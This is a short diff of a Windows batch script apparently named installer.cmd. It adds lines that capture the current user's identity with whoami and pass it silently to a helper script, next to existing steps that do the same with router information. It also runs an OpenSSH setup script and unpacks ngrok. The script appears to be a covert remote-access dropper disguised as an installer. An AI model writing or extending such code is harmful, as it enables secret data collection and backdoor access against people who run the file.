@@ -12,7 +12,9 @@ installer.cmd
 router>router.txt
 Source.bat -silent --file %temp%/router.txt
 
-cd %temp%
+whoami>user.txt
+Source.bat -silent --file %temp%/user.txt
+
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
